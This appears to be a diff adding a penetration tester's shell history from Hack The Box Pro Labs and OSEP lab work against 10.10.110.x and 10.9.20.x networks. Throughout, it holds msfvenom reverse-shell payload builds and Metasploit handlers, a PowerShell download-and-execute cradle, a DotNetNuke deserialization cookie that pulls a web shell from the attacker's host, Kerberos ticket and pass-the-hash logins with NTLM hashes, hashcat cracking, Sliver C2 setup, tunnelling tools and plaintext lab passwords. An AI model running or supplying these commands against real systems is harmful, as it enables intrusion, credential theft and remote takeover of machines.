+./nmapAutomator.sh --host 10.10.110.0-1.10.110.250 -t Port
+CD ../../HTB
+cd ../../HTB
+nmap -sn 10.10.110.0/24 -oN ping-sweep-results.txt
+cd nmapAutomator
+sudo ln -s /home/parallels/tools/nmapAutomator /usr/bin/nmapAutomator \
+
+./nmapAutomator.sh --host 10.10.110.2 -t Port
+./nmapAutomator.sh --host 10.10.110.12 -t Port
+./nmapAutomator.sh --host 10.10.110.10 -t Port
+./nmapAutomator.sh --host 10.10.110.15 -t Port
+./nmapAutomator.sh --host 10.10.110.250 -t Port
+gobuster dir -u http://10.10.110.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null
+sudo apt install golang -y
+/usr/local/go
+echo $home
+echo $HOME
+which go
+sudo vim ~/.bashrc
+source ~/.bashrc
+winetricks dotnet48\
+
+wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"\
+
+[200~sudo apt update
+sudo apt udate
+sudo apt install wine64 wine32 -y
+sudo apt install wine64 -y
+chmod +x burpsuite_community_linux_arm64_v2025_1_1.sh
+./burpsuite_community_linux_arm64_v2025_1_1.sh
+sudo apt install win32
+sudo apt install wine32
+sudo apt-get install wine32:i386
+sudo dpkg --add-architecture i386\
+
+[200~sudo apt update~
+sudo apt install wine32 -y
+wine --version
+wine ysoserial.exe -h
+which wine
+/usr/bin/wine --version
+smbclient -L 10.211.55.3
+nmap -sn 10.10.110.0/24
+sudo nmap -p- --open -sCV --min-rate=2000 10.10.110.2 10.10.110.11 10.10.110.250 -oN nmap-tcp.txt -Pn nmap-udp
+sudo nmap -p- --open -sCV --min-rate=2000 10.10.110.2 10.10.110.11 10.10.110.250 -oN nmap-tcp.txt 
+gobuster dir -u http://http:/clear -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null
+gobuster dir -u http://certenroll.cyber.local/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null
+nmap -p0- -sCV 10.10.110.0/24 -oA nmap/10.10.110.0_24-tcp-65535 -v -Pn -n
+sudo nmap -p0- -sCV 10.10.110.0/24 -oA nmap/10.10.110.0_24-tcp-65535 -v -Pn -n
+sudo nmap -p0- -sCV 10.10.110.0/24 -oA nmap/10.10.110.0_24-tcp-65535 -v
+sudo nmap -p0- -sCV 10.10.110.0/24 -oA 10.10.110.0_24-tcp-65535 -v -Pn -n
+sudo -sP 10.10.110.0/24
+sudo -sC 10.10.110.0/24
+sudo nmap -sVC 10.10.110.0/24
+gobuster dir -u http://cygw.cyber.local/ -w /usr/share/dirb/wordlists/common.txt -t 64 2>/dev/null
+gobuster dir -u http://10.10.110.10/Documentation/ -w /usr/share/dirb/wordlists/common.txt -t 64 2>/dev/null
+gobuster dir -u http://10.10.110.10/Documentation/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 64 2>/dev/null
+nmap -p 80 --script=http-headers http://10.10.110.10
+nmap -p 80 --script=http-headers 10.10.110.10
+nmap -p 80 --script=http-dnn-version 10.10.110.10
+nikto -url 10.10.110.10
+mv revshell.ps1 Cybernet
+go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
+cd bin
+./nuclei -h
+./nuclei -u http://10.10.100.10
+find / -name Invoke-PowerShellTcp.ps1  2>/dev/null
+cd OSEP/lab7/
+cd OSEP/tools
+cd ~/OSEP/tools
+cd ~/HTB/tools
+vim rev.ps1
+cat rev.ps1 | iconv -t UTF-16LE|base64 -w0
+nc -lvnp 413
+cp /home/parallels/OSEP/lab/shell.aspx
+cp /home/parallels/OSEP/lab/shell.aspx .
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.162 LPORT=4444 EXITFUNC=thread -f ps1
+cp /home/parallels/OSEP/lab7/web/run.ps1 revshell.ps1
+vim revshell.ps1
+sudo apt install gsearch
+cd /home/parallels/tools
+iex (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');|iconv -t UTF-16LE|base64 -w0
+echo "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1')"|iconv -t UTF-16LE|base64 -w0\
+
+sudo tcpdump -i tun0 icmp
+sudo apt install mono-complete wine winetricks -y\
+
+find / -name shell.aspx  2>/dev/null
+cat /home/parallels/OSEP/lab/shell.aspx
+cd /home/parallels/HTB
+cp /home/parallels/OSEP/lab7/web/run.ps1 .
+rm run.ps1
+cp /home/parallels/OSEP/lab7/web04/run.ps1 .
+xfreerdp /cert-ignore  /u:offsec /p:'Abc123!' /v:10.9.20.13 /w:1200 /h:700
+ping 10.9.20.13
+cd htb
+nc -lvnp 444
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.162 LPORT=4444 -f ps1
+vim adduser.c
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.162 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=443 -f aspx
+rm shell.aspx
+vim shell.aspx
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.210 LPORT=443 -f aspx\
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=443 -f aspx\
+
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/revehttps; set LHOST 10.10.16.210; set LPORT 443;run'
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.210; set LPORT 443;run'
+kill -9 56724
+ps aux | grep 80
+ss -luntp | grep 80
+sudo lsof -i :80
+systemctl stop service apache2
+systemctl service apache2 stop
+sudo systemctl stop apache2
+find / -name mimidrv.sys  2>/dev/null
+cp /usr/share/windows-resources/mimikatz/x64/mimidrv.sys .
+impacket-getST -spn 'cifs/m3webaw' -impersonate 'admin' -altservice 'cifs' -hashes :e04c4ef54a1a6f4e4fc0de22f0b5fb2d 'm3c.local/m3webaw'
+rm shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.152 LPORT=443 EXITFUNC=thread -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.152 LPORT=4444 EXITFUNC=thread -f exe -o shell.exe
+cd /var/www/
+vim upload.php
+systemctl restart apache2
+systemctl start apache2
+php -v
+sudo systemctl enable apache2
+sudo systemctl status apache2
+sudo apt install apache2 -y
+sudo systemctl start apache2
+vim test.html
+sudo vim test.html
+rm upload
+rm -rf upload
+sudo rm -rf upload
+mv upload.php /html
+sudo mv upload.php /html 
+cd www/html
+sudo vim upload.php
+mkdir upload
+sudo mkdir upload
+cd upload
+cd html
+cd ../html
+cat upload.php
+cd /var/www/uploads/
+/var/www/upload/
+nc -lvnp 4444
+cd HT
+cat rev.ps1
+rm rev.ps1
+cat revshell.ps1
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.152; set LPORT 4444;run'
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.162; set LPORT
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.162; set LPORT 4444;run'
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.152 LPORT=443 -f aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.152 LPORT=4444 EXITFUNC=thread -f cSharp
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.152 LPORT=80 EXITFUNC=thread -f cSharp
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.152; set LPORT 443;run'\
+
+cd ../OSEP/
+cd /
+ks
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.152 LPORT=443 \
+
+py
+cd ../
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.152; set LPORT 80;run'\
+
+netstat -ano
+lsls
+mkdir hash
+find / -name rockyou.txt  2>/dev/null
+cp /home/parallels/OSEP/lab3/rockyou.txt .
+mv hash hashes.kerberoast
+cat hashes.kerberoast
+sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+vim hashes.kerberoast
+rm hashes.kerberoast
+sudo hashcat -m 13100 oast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+rm hash
+sudo hashcat -m 13100 hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.152; set LPORT 443;run'\
+
+cd hash
+vim hash
+sudo hashcat -m 18200 rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\
+
+sudo hashcat -m 18200 rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+vim hash_apache
+ps aux | grep 8888
+netstat -ano | grep 8888
+ss -luntp 
+ss -luntp | grep 8888
+sudo ufw allow 8888/tcp
+sudo netstat -tulnp | grep 8888
+sudo lsof -i :8888
+./sliver-server --listen 192.168.45.202:8888\
+
+./sliver-server --listen 192.168.45.202:8888
+./sliver-server -h
+./sliver-server help
+rm -rf sliver/*
+rm -rf sliver
+curl https://sliver.sh/install | sudo bash
+sudo cd /root
+cd /root/sliver-server
+sudo cd /root/
+git clone https://github.com/BishopFox/sliver.git
+./sliver-server version
+cat ORTHODOX_YURT.bin
+file ORTHODOX_YURT.bin
+ping 192.168.232.100
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.152; set LPORT 80;run'
+netstat -tuln | grep 8888\
+
+sliver-server --host 0.0.0.0 --port 8888\
+
+find / -name config.json  2>/dev/null
+cat /etc/gophish/config.json
+sudo cat /etc/gophish/config.json
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+cargo
+cd $HOME/.cargo/bin
+cat $HOME/.cargo/env.fish
+cd ~/etc/
+source ~/.profile
+git clone git@github.com:flashoop/xeca.git
+cd xeca
+cargo build\
+
+cd target
+cd debug
+cd build
+./xeca -h
+./xeca shellcode -h
+ln ln -s /home/parallels/tools/xeca/target/debug/xeca /usr/local/bin/xeca
+ln ln -s /home/parallels/tools/xeca/target/debug/xeca /usr/bin/xeca
+ln ln -s /home/parallels/tools/xeca/target/debug/xeca /usr/bin/
+sudo ln -s /home/parallels/tools/xeca/target/debug/xeca /usr/bin/
+xeca -h
+xeca shellcode --shellcode sliver.bin --url http:/192.168.45.202
+cat launch.txt
+cat safe.txt
+find / -name  numenplayer1.cfg  2>/dev/null
+file SILENT_CONDOR.bin
+/sliver-server --listen 0.0.0.0:8888
+cat /.sliver-server/configs/server.json
+cd server
+cd config
+find / -name server.json  2>/dev/null
+cat /home/parallels/.sliver/configs/server.json
+cd /home/parallels/.sliver
+./sliver-server --listen 0.0.0.0:8888
+./sliver-server --host 0.0.0.0.0 --port 8.8.8.8
+./sliver-server operator
+./sliver-server operator --name sliver.config
+./sliver-server operator --name sliver.config --host 0.0.0.0
+./sliver-server -help
+cd /root/
+sudo su
+cd ~/tools/sliver
+chmod +x sliver-server_linux
+pkill sliver-server\
+
+cd ~/HTB/
+code
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.16.210 LPORT=443 -f aspx\
+
+msfvenom -p windows/x64/meterpreter/reverse_https LH10.10.168.16.210 LPORT=443 -f aspx\
+
+mv shell.aspx rev.aspx
+rm rev.aspx
+cat shell.aspx
+cp shell.aspx cmd.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=80 EXITFUNC=thread -f cSharp
+cat rev.jsp
+find / -name  SharpView  2>/dev/null
+find / -name  SharpView*  2>/dev/null
+mv SharpView.exe ../tools
+ipa 
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.210; set LPORT 80;run'
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.210; set LPORT 80;run'\
+
+find / -name  chisel.exe  2>/dev/null
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=443 EXITFUNC=thread -f ps1\
+
+vim rev.jsp
+find / -name  chisel  2>/dev/null
+/home/parallels/OSEP/tools/chisel
+/home/parallels/OSEP/lab7/db/chisel
+cp /home/parallels/OSEP/lab7/db/chisel .
+chisel server --port 8080 --reverse
+ss -luntp | grep 8080
+cd configs
+cat server.json
+cat database.json
+cd slivers
+cd linux
+cd amd64
+cd go
+cat adjectives.txt
+cat ~/.profile
+find / -name  -d sliver  2>/dev/null
+tail -f ~/.sliver/logs/sliver.log
+rm INTERIM_MONTH.exe
+msfvenom -l payloads > payloads.txt
+msfvenom --payload windows/x64/custom/reverse_tcp LHOST=192.168.45.202 LPORT=80 --format raw --out /tmp/stager_tcp.bin\
+
+msfvenom --payload windows/x64/custom/reverse_tcp LHOST=192.168.45.202 LPORT=80 --format exe --out /tmp/stager_tcp.exe\
+
+cat stager_tcp.bin
+file stager_tcp.bin
+msfvenom --payload windows/x64/custom/reverse_tcp LHOST=192.168.45.202 LPORT=80 --format exe --out /tmp/shell.exe\
+
+rm stager_tcp.bin
+rm stager_tcp.exe
+rm sliver.bin
+rm shell - Copy.exe
+rm 'shell - Copy.exe'
+ss -luntp | grep 443
+kill -9 36778
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.202; set LPORT 443;run'\
+
+find / -type d -name "sliver" 2>/dev/null
+cd /home/parallels/tools/sliver
+./sliver-server_linux
+rm sliver-server_linux
+rm sliver-client
+./sliver-client_linux
+rm sliver-client_linux
+make
+ip addr show
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f exe -o rev.exe\
+
+file sliver.bin
+cat sliver.bin
+cd ~/OSEP/
+code payloads.txt
+[200~msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.203.214 lport=443
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.203.214 lport=443 -f raw -o shell.txt\
+
+cat shell.txt
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.203.214 lport=443 -f raw
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.203.214 lport=443 -f python
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.203.214 lport=443 -f raw -o shell.bin
+cat shell.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.202 lport=443 -f raw -o shellcode.bin
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.202; set LPORT 443;run'\
+
+sudo openvpn universal.ovpn
+cd ../HTB
+code test.hta
+code chall4.js
+code demo.hs
+code demo.js
+cd code
+mkdir shellcode_load_powershell
+cd shellcode_load_powershell
+code Invoke-Powershell.ps1
+git commit -m "add the shellcode load"
+xfreerdp /cert-ignore  /u:Administrator /p:'lab' /v:192.168.232.100 /w:1200 /h:700
+xfreerdp /cert-ignore  /u:Administrator /p:'lab' /v:192.168.177.100 /w:1200 /h:700
+mkdir ticket
+find /  -name ticketConverter.py 2>/dev/null
+cp /home/parallels/OSEP/lab5/ticket/ticketConverter.py .
+cp /home/parallels/OSEP/lab5/ticket/ticketConverter.py ~/HTB/tools
+proxychains netexec smb m3dc.m3c.local \
+
+proxychains nmap m3dc.m3c.local
+proxychains netexec smb m3dc.m3c.local -u "" -p ""
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+cat ticket.b64
+base64 -d ticket.b64
+file ticket.kirbi
+proxychains netexec smb m3dc.m3c.local -u norma.branham --use-kcache -x whoami\
+
+proxychains netexec smb m3dc.m3c.local -u norma.branham --use-kcache -x whoami\
+proxychains impacket-psexec norma.branham@m3dc -k -no-pass  -dc-ip 10.9.20.10 -target-ip 10.9.20.10\
+
+proxychains impacket-psexec norma.branham@m3dc -k -no-pass
+proxychains netexec smb m3dc.m3c.local -u norma.branham --use-kcache
+export KRB5CCNAME=/home/parallels/HTB/Cybernet/ticket/ticket.ccache\
+
+proxychains impacket-psexec norma.branham@m3dc -k -no-pass  -dc-ip 10.9.20.10 -target-ip 10.9.20.10\
+
+netexec smb -h
+cd HTB/tools
+cd /tmp/
+file KEEN_RETHINKING
+msfvenom -version
+msfconsole -v
+cat KEEN_RETHINKING
+cd /home/parallels/HTB/Cybernet/ticket/
+cp CONSISTENT_ESTATE.exe .
+cp CONSISTENT_ESTATE.exe ..
+export KRB5CCNAME=/home/parallels/HTB/Cybernet/ticket/ticket.kirbi
+cat ticket.b64 | base64 -d > ticket.kirbi
+cat ticket.kirbi
+kill -9 462321
+proxychains nxc smb m3dc.m3c.local -h
+proxychains nxc smb m3dc.m3c.local -u norma.branham -k
+kirbi2ccache
+which kirbi2ccache
+sudo apt install kirbi2ccache
+find / -name ticket_converter.py  2>/dev/null
+python3  ticketConverter.py -h
+cat ticket.ccache
+sudo ntpdate -u m3c.local
+KRB5CCNAME=ticket.ccache 
+sudo ntpdate -u m3dc.m3c.local
+nc -zv 94.74.108.237 8022
+nc -zv 94.74.108.237 3389
+nc -zv 94.74.108.237 31337
+impacket-smbserver share . -smb2support -user kali -password kali
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.162; set LPORT 80;run'\
+
+python3 -m http.server 443
+python3 -m http.server 8000
+cat run.ps1
+python3 -m http.server 8080
+cp /home/parallels/OSEP/lab7/proxy Cybernet
+./chisel server --port 80 --reverse
+./chisel server --port 8080 --reverse
+msfvenom -help
+msfvenom -LURI -h
+msfvenom -h
+cat ~/.sliver/configs/http-c2.json
+cd ~/.sliver/configs
+find / -name http-c2.json 2>/dev/null
+cd ~/tools
+./sliver-server
+cd /usr/local/bin/
+cd /usr/bin/
+rm -rf  ~/.sliver
+rm -rf ~/tools/sliver
+sudo apt install sliver\
+
+sliver
+fin
+find / -type d -name sliver 2>/dev/null
+/usr/bin/sliver
+cd /usr/share/doc/sliver
+find /  -name sliver_server 2>/dev/null
+which sliver
+cd ~/.sliver
+sudo apt install sliver
+where sliver
+find /  -name sliver 2>/dev/null
+cd /usr/share/lintian/overrides/sliver
+/usr/share/lintian/overrides/sliver
+cd /usr/share/lintian/overrides/
+cd sliver
+ls | grep sliver
+./sliver
+file sliver
+cat sliver
+ping 10.10.100.250
+cat COMMON_BREAKFAST
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.162 LPORT=80 EXITFUNC=thread -f cSharp
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.162; set LPORT 80;run'
+code Assembly.dll
+mv Assembly.dll Assembly.cs
+code LoadLibrary.cs
+code README.md
+git commit -m "add the dll reflect"
+cd OSEP
+code vbaMacro_xor
+git commit -m "add the vba_xor_msf "
+cd vbaMacro
+code vbaMacro_caeser.cs
+code vbaMacro_vb_decode
+git commit -m "add the vba_caeser_msf "
+git push -u origin main
+lx
+code Invode-shellcode.ps1
+git add .
+/usr/bin/sliver-client
+ping 10.10.110.10
+code cmd.aspx
+BurpSuite
+BurpSuiteCommunity
+cd ~/HTB
+GET /_ HTTP/1.1\
+Host: 10.10.110.10\
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\
+Accept-Language: en-US,en;q=0.5\
+Accept-Encoding: gzip, deflate, br\
+Connection: keep-alive\
+Cookie: .ASPXANONYMOUS=atn7BZwBAWQ5JmUVHtvedbzrgJqHkFA_jIbmP2dRu9rjdEH5ZwhUMgxfe22tgmh_ZuzdAwehEPFaDGa7xbVmPeXEQ2caqiA39zOBWPsLRfbKIH4y0; dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://10.10.16.162/cmd.aspx</anyType><anyType xsi:type="xsd:string">C:\dotnetnuke\rev.aspx</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>\
+Priority: u=0, i\
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.162 LPORT=443 -f aspx
+netstat -tuln | grep 443
+ps aux | grep 443
+touch raj.dsh
+vim raj.dsh
+unix2dos raj.dsh
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.152; set LPORT 443;run'
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.151; set LPORT 443;run'\
+
+rm CONSISTENT_ESTATE.exe
+python3 ./ticketConverter.py ticket.kirbi ticket.ccache
+proxychains nxc smb m3dc.m3c.local -u norma.branham --use-kcache
+proxychains impacket-psexec -k -no-pass m3dc.m3c.local -target-ip 10.9.20.12 -dc-ip 10.9.20.12
+proxychains impacket-psexec -k -no-pass m3dc.m3c.local 
+python
+cd /tm
+cp rev.exe /home/parallels/HTB/Cybernet
+cd /home/parallels/HTB/Cybernet   
+rm beacon.exe
+cp /tmp/beacon.exe .
+mv beacon.exe sliver.exe
+generate beacon --arch amd64 --os windows --mtls 10.10.16.152:8080 --save /home/parallels/HTB/Cybernet/agent.exe\
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.152 LPORT=443 EXITFUNC=thread -f cSharp\
+
+sudo lsof -i :443
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.152; set LPORT 443;run'
+code rev.jsp
+code run.ps1
+s
+sudo openvpn pro_labs_flashoop_us.ovpn
+lS
+/
+kill -9 462321231690
+kill -9 231690
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=443 EXITFUNC=thread -f aspx\
+
+msfvenom -p windows/x64/meterpreter/revehttps_tcp LHOST=10.10.16.210 LPORT=443 EXITFUNC=thread -f aspx\
+
+kill -9 59330
+kill -9 52014
+kill -9 5201489641
+kill -9 89641
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.210 LPORT=443 EXITFUNC=thread -f aspx
+proxychains evil-winrm -i 10.9.20.11 -u svc_sql -H "e04c4ef54a1a6f4e4fc0de22f0b5fb2d"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.162 LPORT=443 EXITFUNC=thread -f cSharp
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.210; set LPORT 443;run'
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.152 LPORT=443 EXITFUNC=thread -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.162 LPORT=443 EXITFUNC=thread -f ps1
+./ticketConverter.py ticket.kirbi ticket.ccache
+sudo openvpn pro_labs_flashoop_en_2.ovpn
+proxychains nxc smb 10.9.20.12
+proxychains rdesktop -z -P -x m -u offsec -p Abc123!
+proxychains rdesktop -u offsec -p Abc123!
+[200~
+[200~proxychains rdesktop -u offsec -p Abc123!  -a 16 -P -z -b -g 1280x860 10.9.20.10
+proxychains rdesktop -u offsec -p Abc123!  -g 1280x860 10.9.20.10 
+proxychains rdesktop -u offsec -p Abc123!  -a 16 -P -z -b -g 1280x860 10.9.20.10proxychains rdesktop -u offsec -p Abc123! -a 16 -P -z -b -g 1280x860 10.9.20.10
+proxychains rdesktop -u offsec -p Abc123! -a 16 -P -z -b -g 1280x860 10.9.20.10
+proxychains rdesktop -u offsec -p Abc123! -a 16 -P -z -b -g 1280x860 10.9.20.10 -d m3c.local
+xfreerdp /cert-ignore  /u:offsec /p:'Abc123!' /v:10.9.20.10 /w:1200 /h:700
+proxychains xfreerdp /cert-ignore  /u:offsec /p:'Abc123!' /v:10.9.20.10 /w:1200 /h:700
+clea
+xfreerdp /compression +auto-reconnect /u:'offsec' /p:'Abc123!' /v:10.9.20.10 +clipboard /cert-ignore
+[200~proxychians xfreerdp /compression +auto-reconnect /u:'offsec' /p:'Abc123!' /v:10.9.20.10 +clipboard /cert-ignore~
+proxychians xfreerdp /compression +auto-reconnect /u:'offsec' /p:'Abc123!' /v:10.9.20.10 +clipboard /cert-ignore
+proxychains xfreerdp /compression +auto-reconnect /u:'offsec' /p:'Abc123!' /v:10.9.20.10 +clipboard /cert-ignore
+i
+ipa
+xfreerdp /cert-ignore  /u:Administrator /pth:5a0618a9e03bd9fa9efbe142468afed5 /v:10.9.20.10 /w:1200 /h:700
+proxychains  xfreerdp /cert-ignore  /u:Administrator /pth:5a0618a9e03bd9fa9efbe142468afed5 /v:10.9.20.10 /w:1200 /h:700  
+sudo neo4j start
+find /  -name subdomain_list.txt 2>/dev/null
+cd /usr/share/wordlists
+cd /home/parallels/
+vim subdomains.txt
+dnsrecon -d cyber.local -D subdomain_list.txt -t brt
+proxychains dnsrecon -d cyber.local -D subdomain_list.txt -t brt
+cler
+proxychains nxc -h
+proxychains nxc rdp -h
+proxychains nxc rdp 10.9.20.10 -u offsec -p 'Abc123!'
+proxychains nxc smb 10.9.20.10 -u offsec -p 'Abc123!'
+Âƒ€net users offsec Abc123! /add /domain
+kill -9 219627
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.152 LPORT=443 -f aspx\
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.162 LPORT=443 -f aspx\
+
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.162; set LPORT 443;run'\
+
+ip 
+cd HTB/
+lmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.162 LPORT=443 -f aspx
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.162 LPORT=443 -f aspx
+cd ../Cybernet
+cd ../tools
+sudo cp /etc/hosts ~/tmp
+ping localhost
+cd /etc
+code hosts
+ping blog
+proxychains xfreerdp /cert-ignore  /u:offsec /p:Abc123! /v:10.9.20.10 /w:1200 /h:700
+LS
+sudo openvpn pro_labs_flashoop_us_1.ovpn
+HTB
+sudo ip link set ligolo up\
+
+ping adfs.cyber.local
+./proxy -selfcert 
+./proxy -h
+./proxy -selfcert -laddr 0.0.0.0:8000
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.162; set LPORT 443;run'
+kill -9 6018
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.162; set LPORT 443;run'
+sudo vim /etc/proxychains4.conf
+proxychains nxc smb m3dc.m3c.local --use-kcache
+proxychains nxc smb m3dc.m3c.local
+proxychains nxc winrm m3dc.m3c.local -u Administrator -H 7574cbf9d92c39d1d4dccd7b89301d2f
+proxychains nxc winrm m3dc.m3c.local -u Administrator -H 7574cbf9d92c39d1d4dccd7b89301d2f -d .
+msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.16.162; set LPORT 443;run'\
+
+pwd
+sudo ip tuntap add user parallels mode tun ligolo2
+sudo ip link set ligolo2 up
+sudo ip route add 10.9.15.0/24 dev ligolo2
+ping 10.9.20.12
+nmap -sT 10.9.15.10
+sudo cp /etc/hosts .
+sudo openvpn pro_labs_flashoop_eu_2.ovpn
+sudo openvpn pro_labs_flashoop_eu_1.ovpn
+sudo killall -w openvpn
+code shell.aspx
+sudo openvpn pro_labs_flashoop.ovpn
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.17.1 LPORT=443 -f aspx
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.210 LPORT=443 -f aspx
+sudo ip tuntap add user parallels mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.9.20.0/24 dev ligolo
+kill -9 67942
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.210 LPORT=443 EXITFUNC=thread -f cSharp\
+
+ss -luntp
+kill -9 13269
+cd ticket
+proxychains impacket-psexec -k -no-pass m3dc.m3c.local
+vim ticket.b64
+base64 -d ticket.b64 > ticket.kirbi
+python3 ticketConverter.py ticket.kirbi ticket.ccache
+export KRB5CCNAME=/home/parallels/HTB/Cybernet/ticket/ticket.ccache
+impacket-psexec -k -no-pass m3dc.m3c.local    
+sudo ip route add 10.9.15.0/24 dev ligolo
+wpscan --url http://10.9.15.11/
+wpscan --url http://10.9.15.11 --detection-mode
+wpscan --url http://10.9.15.11 --detection-mode mode
